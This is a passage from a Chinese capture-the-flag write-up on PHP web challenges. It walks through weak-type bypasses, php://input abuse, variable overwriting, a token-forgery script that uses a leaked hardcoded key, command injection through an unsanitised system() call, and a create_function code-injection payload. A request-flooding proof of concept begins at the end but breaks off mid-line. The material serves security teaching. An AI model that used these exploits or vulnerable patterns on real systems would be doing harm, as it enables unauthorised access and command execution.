class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求token长度为10且token!=0为假，有两种绕过方法，第一种传入token=0000000000绕过，第二种利用弱类型（含有数字内容的字符串也会被转换类型）传入token=0e12345678绕过。</p><h2 id="33-file-get-contents"><a href="#33-file-get-contents" class="headerlink" title="33.file_get_contents"></a>33.file_get_contents</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$file = $_GET[&apos;file&apos;];</span><br><span class="line">if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123;</span><br><span class="line">    echo $nctf;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure><p>file_get_contents() 函数将整个文件读入一个字符串 </p><p>这里使用第九题中提到的php伪协议之一：”php://input”可以访问请求的原始数据的只读流,，将post请求中的数据作为PHP代码执行。 </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/27.jpg"><h2 id="34-变量覆盖"><a href="#34-变量覆盖" class="headerlink" title="34.变量覆盖"></a>34.变量覆盖</h2><p>代码审计类题目 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--foreach($_GET as $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">&#125;  </span><br><span class="line">if($name == &quot;meizijiu233&quot;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure><p>foreach 遍历数组或对象，它会把当前单元的键名也会在每次循环中被赋给变量 $key，值赋给变量$value</p><p>$$ 的意思参考<a href="http://php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">可变变量</a>  </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/28.jpg"><h2 id="35-HateIT"><a href="#35-HateIT" class="headerlink" title="35. HateIT"></a>35. HateIT</h2><p>这道题太难了！我是跟着网上的writeup一步一步复现的，不然自己根本想不到。</p><p>先了解一下web中敏感文件泄露的原因和方法：<a href="https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html" target="_blank" rel="noopener">传送门</a></p><p>扫描发现robots.txt，admin.php，upload/upload.php，.git/ </p><p>upload/uploa.php不能直接访问，估计是看cookie的 </p><p>使用 <a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 工具将 git 文件下载下来，发现只有一个<code>README.md</code> </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/dvcs.jpg"><img src="/2018/11/14/CG-CTF-web篇零基础指南/catreadme.jpg"><p>提示有历史版本，看来得恢复文件，通过<code>git log</code>查看记录 </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/gitlog.jpg"><p>通过<code>git reset</code>回滚版本 </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/gitreset.jpg"><p>拿到了三个通过扩展加密的 php文件和一个txt文件，opcode.txt有index.php，class.php，func.php的 opcode 代码，可以解密这三个php文件。</p><p>看一下robots.txt</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/robot.jpg"><p><code>suenc.so</code> 是一个加密扩展文件，可以下载下来，用来解密admin.php 。</p><p>因为我很菜还不会逆向，所以直接贴网上师傅们解密出来的代码了</p><p><strong>index.php</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(!isset($_SESSION))</span><br><span class="line">    &#123;</span><br><span class="line">        session_start();</span><br><span class="line">    &#125;    </span><br><span class="line">    echo &apos;...这部分前端内容我就省略不贴了...&apos;;    </span><br><span class="line">    include_once(&apos;func.php&apos;);    </span><br><span class="line">    if(isset($_GET[&apos;username&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $username = $_GET[&apos;username&apos;];</span><br><span class="line">        $md5 = md5(get_identify().$username);</span><br><span class="line">        $admin = 0;</span><br><span class="line">        $token = encrypt($username.&apos;|&apos;.$admin.&apos;|&apos;.$md5);</span><br><span class="line">        $_SESSION[&apos;sign&apos;] = $md5;</span><br><span class="line">        $_SESSION[&apos;token&apos;] = $token;</span><br><span class="line">    &#125;</span><br><span class="line">    showImage();    if(isset($_GET[&apos;token&apos;]) &amp;&amp; isset($_GET[&apos;sign&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $token = $_GET[&apos;token&apos;];</span><br><span class="line">        $sign = $_GET[&apos;sign&apos;];        echo &apos;sign : &apos;.$sign.&apos;&lt;br&gt;&apos;;        echo &apos;token: &apos;.$token.&apos;&lt;br&gt;&apos;;</span><br><span class="line">        $info = explode(&apos;|&apos;, decrypt($token));        echo decrypt($token);</span><br><span class="line">        var_dump($info);        if(count($info) == 3)</span><br><span class="line">        &#123;            if(md5(get_identify().$info[0]) == $info[2])</span><br><span class="line">            &#123;</span><br><span class="line">                $sign = $info[1];</span><br><span class="line">                $admin = $info[1];</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $admin = $info[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;else&#123;        if(isset($_SESSION[&apos;token&apos;]) &amp;&amp; isset($_SESSION[&apos;sign&apos;]))</span><br><span class="line">        &#123;            echo &apos;sign : &apos;.$_SESSION[&apos;sign&apos;].&apos;&lt;br&gt;&apos;;            echo &apos;token: &apos;.$_SESSION[&apos;token&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">            $token = $_SESSION[&apos;token&apos;];</span><br><span class="line">            $sign = $_SESSION[&apos;sign&apos;];</span><br><span class="line">            $info = explode(&apos;|&apos;, decrypt($token));            if(count($info) == 3)</span><br><span class="line">            &#123;                if(md5(get_identify().$info[0]) == $info[2])</span><br><span class="line">                &#123;</span><br><span class="line">                    $sign = $info[1];</span><br><span class="line">                    $admin = $info[1];</span><br><span class="line">                    </span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    $admin = $info[1];</span><br><span class="line">                &#125;                echo &apos;&lt;br&gt;&apos;.$admin;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    if(isset($admin) &amp;&amp; $admin == 3)</span><br><span class="line">    &#123;</span><br><span class="line">        $_SESSION[&apos;auth&apos;] = &apos;admin&apos;;        echo &quot;&lt;a href=&apos;admin.php&apos;&gt;Admin&lt;/a&gt;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>func.php</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: meizj</span><br><span class="line"> * Date: 2018/2/2</span><br><span class="line"> * Time: 下午9:25</span><br><span class="line"> */include &quot;class.php&quot;;</span><br><span class="line">define(&quot;KEY&quot;,&quot;8690475385984657&quot;);</span><br><span class="line">define(&quot;method&quot;,&quot;aes-128-cfb&quot;);</span><br><span class="line">define(&quot;BS&quot;,16);</span><br><span class="line">define(&quot;IDENTIFY&quot;,&quot;9850375038&quot;);function get_token()&#123;</span><br><span class="line">    $token = &apos;&apos;;    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $token .= chr(rand(1,255));</span><br><span class="line">    &#125;    return $token;</span><br><span class="line">&#125;function enc($s)&#123;</span><br><span class="line">    $token = get_token();</span><br><span class="line">    $code1 = openssl_encrypt(string($s),method,key,OPENSSL_RAW_DATA,$token);</span><br><span class="line">    $code2 = base64_encode(base64_encode($token.&quot;-&quot;.$code1));    return $code2;</span><br><span class="line">&#125;function dec($s)&#123;    if($cc = base64_decode(base64_decode($s)))</span><br><span class="line">    &#123;        if($iv = substr($cc,0,16))</span><br><span class="line">        &#123;            if($d = substr($cc,17))</span><br><span class="line">            &#123;                if($s = openssl_decrypt($d, method, key, OPENSSL_RAW_DATA,$iv))</span><br><span class="line">                &#123;                    return $s;</span><br><span class="line">                &#125;                else</span><br><span class="line">                    die(&quot;error&quot;);</span><br><span class="line">            &#125;            else</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;        else</span><br><span class="line">            return 0;</span><br><span class="line">    &#125;    else</span><br><span class="line">        return 0;</span><br><span class="line">&#125;function uploadImage()&#123;    if($_SESSION[&apos;auth&apos;] !== &quot;admin&quot;)&#123;        die(&quot;Auth Failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $AllowedType = array(        &quot;png&quot;,        &quot;gif&quot;,        &quot;jpg&quot;</span><br><span class="line">    );</span><br><span class="line">    $filename = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    $filesize = $_FILES[&apos;file&apos;][&apos;size&apos;];    if($filesize &gt; 1000000)&#123;        exit(&quot;Too large&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $fileext = substr($filename, strrpos($filename, &apos;.&apos;)+1);    if(in_array($fileext,$AllowedType))&#123;</span><br><span class="line">        $file = &quot;thumbs/images/&quot;.md5(time().&quot;admin&quot;).&quot;.&quot;.$fileext;        if(file_exists($file))&#123;            exit(&quot;File existed already&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;        exit(&quot;Not Allowed Ext&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;function viewImage($name)&#123;    if($_SESSION[&apos;auth&apos;] !== &quot;admin&quot;)&#123;        die(&quot;Auth Failed&quot;);</span><br><span class="line">    &#125;    new ImageView($name);</span><br><span class="line">&#125;function showImage()&#123;</span><br><span class="line">    $obj = new Home(&quot;thumbs/images/&quot;);</span><br><span class="line">    $obj-&gt;showImg();</span><br><span class="line"></span><br><span class="line">&#125;function to($str) &#123;    return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));</span><br><span class="line">&#125;function re($str) &#123;    return substr($str, 0, -ord(substr($str, -1, 1)));</span><br><span class="line">&#125;function getkey()&#123;    return KEY;</span><br><span class="line">&#125;function get_identify()&#123;    return IDENTIFY;</span><br><span class="line">&#125;function encrypt($str)&#123;</span><br><span class="line">    $key = getkey();</span><br><span class="line">    srand(time() / 300);</span><br><span class="line">    $token = get_token();</span><br><span class="line">    $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token));    return base64_encode($cipher);</span><br><span class="line">&#125;function decrypt($str)&#123;</span><br><span class="line">    $decode = base64_decode($str);</span><br><span class="line">    $key = getkey();</span><br><span class="line">    srand(time() / 300);</span><br><span class="line">    $token = get_token();</span><br><span class="line">    $bin = hex2bin($str);</span><br><span class="line">    $plain = re(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$bin , MCRYPT_MODE_CFB, $token));    return $plain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>class.php</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: meizj</span><br><span class="line"> * Date: 2018/2/2</span><br><span class="line"> * Time: 下午11:00</span><br><span class="line"> */class ImageView&#123;    private $filename = &quot;&quot;;    function __construct($name)&#123;</span><br><span class="line">        $this-&gt;filename = &quot;images/$name&quot;;</span><br><span class="line">        $this-&gt;createThumbnail();</span><br><span class="line">    &#125;    function createThumbnail()&#123;</span><br><span class="line">        $e = stripcslashes(preg_replace(&apos;/[^0-9\\\]/&apos;,&apos;&apos;,isset($_GET[&apos;size&apos;])?$_GET[&apos;size&apos;]:25));</span><br><span class="line">        system(&quot;/usr/bin/convert &#123;$this-&gt;filename&#125; --resize $e ./thumbs/&#123;$this-&gt;filename&#125;&quot;);</span><br><span class="line">    &#125;    function __toString()</span><br><span class="line">    &#123;        // TODO: Implement __toString() method.</span><br><span class="line">        return &quot;&lt;a href=&#123;$this-&gt;filename&#125;&gt;</span><br><span class="line">                &lt;img src=./thumbs/&#123;$this-&gt;filename&#125;&gt;&lt;/a&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;class Home&#123;    private $dir = &quot;&quot;;    public function __construct($dir)&#123;</span><br><span class="line">        $this-&gt;dir = $dir;</span><br><span class="line">    &#125;    public function showImg()&#123;</span><br><span class="line">        $files = $this-&gt;getDirFile($this-&gt;dir);        foreach ($files as $file)&#123;            echo &quot;&lt;img src=$file&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    public function getDirFile($dir)&#123;</span><br><span class="line">        $files = array();        if(!is_dir($dir)) &#123;            return $files;</span><br><span class="line">        &#125;</span><br><span class="line">        $handle = opendir($dir);        if($handle) &#123;            while(false !== ($file = readdir($handle))) &#123;                if ($file != &apos;.&apos; &amp;&amp; $file != &apos;..&apos;) &#123;</span><br><span class="line">                    $filename = $dir . &quot;/&quot;  . $file;                    if(is_file($filename)) &#123;</span><br><span class="line">                        </span><br><span class="line">                            $files[] = $filename;</span><br><span class="line">                        </span><br><span class="line">                    &#125;else &#123;</span><br><span class="line">                        $files = array_merge($files, get_files($filename));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;   //  end while</span><br><span class="line">            closedir($handle);</span><br><span class="line">        &#125;        return $files;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>admin.php</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: meizj</span><br><span class="line"> * Date: 2018/2/2</span><br><span class="line"> * Time: 下午9:38</span><br><span class="line"> */session_start();if($_SESSION[&apos;auth&apos;]!==&quot;admin&quot;)&#123;    die(&quot;Auth Failed!&quot;);</span><br><span class="line">&#125;include &quot;func.php&quot;;if(isset($_GET[&apos;action&apos;]))&#123;</span><br><span class="line">    $action = $_GET[&apos;action&apos;];    if($action == &quot;uploadImage&quot;)&#123;        include_once &quot;template/upload.php&quot;;        if(isset($_FILES[&apos;file&apos;]))&#123;</span><br><span class="line">            uploadImage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;elseif ($action == &quot;viewImage&quot;)&#123;</span><br><span class="line">        $file = isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;23.jpg&quot;;</span><br><span class="line">        viewImage($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看<code>index.php</code>，这里会将<code>$token</code>解密，如果<code>$admin==3</code>就有权限访问<code>admin.php</code>，我们在本地生成加密 token </p><p>token的加密脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;KEY&quot;,&quot;8690475385984657&quot;);</span><br><span class="line">define(&quot;method&quot;,&quot;aes-128-cfb&quot;);</span><br><span class="line">define(&quot;BS&quot;,16);</span><br><span class="line">define(&quot;IDENTIFY&quot;,&quot;9850375038&quot;);</span><br><span class="line"></span><br><span class="line">function getkey()&#123;</span><br><span class="line">    return KEY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_identify()&#123;</span><br><span class="line">    return IDENTIFY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_token()&#123;</span><br><span class="line">    $token = &apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $token .= chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function to($str) &#123;</span><br><span class="line">    return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($str)&#123;</span><br><span class="line">    $key = getkey();</span><br><span class="line">    srand(time() / 300);</span><br><span class="line">    $token = get_token();</span><br><span class="line">    $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token));</span><br><span class="line">    return base64_encode($cipher);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = &apos;qwer&apos;;</span><br><span class="line">$md5 = md5(get_identify().$username);</span><br><span class="line">$admin = &apos;3&apos;;</span><br><span class="line">$token = encrypt($username . &apos;|&apos; . $admin . &apos;|&apos; . $md5);</span><br><span class="line">echo $md5;</span><br><span class="line">echo &quot;\n&quot;</span><br><span class="line">echo $token;</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>这个指定admin为3，生成一个token</p><p>windows 跟 linux 的随机数是有差异的 ，所以脚本要拉到linux环境中执行。</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/linux.jpg"><p>拿到了sign和token，访问<a href="http://45.76.173.177:23333/?sign=30dd01f4a4aeb5598d20ce3084e120a5&amp;token=YmMxNWI3MzY5MmFjZTA0NzExMzQwMjBhMDNiNGFhODYyZWVjNDQ1ZWY5NjI4ZDQ5NWI3YWE4OGFhNmZkNTg2OWQ0ZTdmYjg4ZTVlMjQ4Mjg5N2JhNWY5NDJjM2FjYzI4" target="_blank" rel="noopener">http://45.76.173.177:23333/?sign=30dd01f4a4aeb5598d20ce3084e120a5&amp;token=YmMxNWI3MzY5MmFjZTA0NzExMzQwMjBhMDNiNGFhODYyZWVjNDQ1ZWY5NjI4ZDQ5NWI3YWE4OGFhNmZkNTg2OWQ0ZTdmYjg4ZTVlMjQ4Mjg5N2JhNWY5NDJjM2FjYzI4</a></p><img src="/2018/11/14/CG-CTF-web篇零基础指南/32.jpg"><p>拿到管理员权限后接着看<code>admin.php</code>，文件上传好像是因为没有目录权限，一直上传不上东西，就算了。<code>viewImage</code>调用了<code>ImageView</code>类，最终通过调用系统命令的方式修改图片大小，这里没有对<code>$filename</code>进行过滤，直接拼接到命令执行中，构造 payload 执行命令</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/33.jpg"><p>接下来就是寻找flag之旅了，最后发现flag在/etc/目录下</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/33.jpg"><p>获得flag！</p><p>补充一下审计admin.php源码的过程：</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/view1.jpg"><p>跟进viewImage 跟进ImageView </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/view2.jpg"><p>这里可以命令执行 </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/view3.jpg"><p>file的地方就可以传进去命令 </p><h2 id="36-Anonymous"><a href="#36-Anonymous" class="headerlink" title="36. Anonymous"></a>36. Anonymous</h2><p>这道题学到了很有意思的知识！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Anonymous 匿名的</span><br><span class="line">PHP是最好的语言，不是吗？</span><br><span class="line">// SUCTF 2018，出题人：梅子酒</span><br><span class="line">//题目地址 http://45.76.173.177:23334/</span><br></pre></td></tr></table></figure><p>根据题目可能是考php匿名函数 </p><p>先看代码 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function SUCTF_$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure><p>先学习一下匿名函数的创建create_function()：</p><p><code>string create_function (string $args, string $cod)</code></p><p>string $args：变量部分</p><p>string $code：方法代码部分 </p><p>一个官方提供的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$newfunc = create_function(&apos;$a,$b&apos;, &apos;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&apos;);</span><br><span class="line">echo &quot;New anonymous function: $newfunc&quot;;</span><br><span class="line">echo $newfunc(2, M_E);</span><br><span class="line">// outputs</span><br><span class="line">// New anonymous function: lambda_1</span><br><span class="line">// ln(2) + ln(2.718281828459) = 1.6931471805599</span><br><span class="line">// M_E 是 php 中常量 e 的表示形式</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>顺便学习一下利用create_function()进行代码注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&apos;id&apos;];</span><br><span class="line">$b=&apos;echo&apos;.$a.&quot;;&quot;;</span><br><span class="line">$f=create_function(&apos;$a&apos;,$b);  /* 参数 &apos;$a&apos; $b 函数体</span><br><span class="line">$f($a);</span><br><span class="line">?&gt;</span><br><span class="line">这个匿名函数相当于这样的创建函数过程:</span><br><span class="line"></span><br><span class="line">function niming($a)&#123;  </span><br><span class="line">       echo $id.&apos;is&apos;.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload:?id=1;&#125;phpinfo();/*</span><br><span class="line">可以看到phpinfo的信息；</span><br></pre></td></tr></table></figure><p>回到这道题，了解一下本题代码中的几个函数</p><p> bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。</p><p>openssl_random_pseudo_bytes 函数根据参数来生成指定个数的随机字节。</p><p>die() 函数输出一条消息，并退出当前脚本。 </p><p>这道题用到的知识点是： 匿名函数的名字和apache的Pre-fork模式</p><p>Apache的默认模式Pre-fork会随着请求数量的增加而启动若干新的进程 。</p><p>create_function创建的是匿名函数，而匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数。%d会从1一直进行递增，表示这是当前进程中第几个匿名函数。因此如果开启一个新的php进程，那么这个匿名函数就是\x00lambda_1，所以思路就是通过向Pre-fork模式的apache服务器发送大量请求，致使apache开启新的进程来处理请求，那么传递<code>func_name=%00lambda_1</code>就可以执行函数了。</p><p>经过了解以上知识，我写了一个超级简单无脑的python脚本跑了一下就跑出来了flag，就是一直传递<code>func_name=%00lambda_1</code>参数向服务器发起请求，然后直到服务器启动了新的进程这个请求就可以获取flag了。</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/29.jpg"><p>把url改一下就可以了。这道题改编自HITCON2017的一道web题，只考察了后半部分的知识点，原题orange师傅给出的官方writeup中的poc如下：</p><p>fork.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line">try:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line">def run(i):</span><br><span class="line">    while 1:</span><br><span class="line">        HOST = &apos;x.x.x.x&apos;</span><br><span class="line">        PORT = 80</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(&apos;GET / 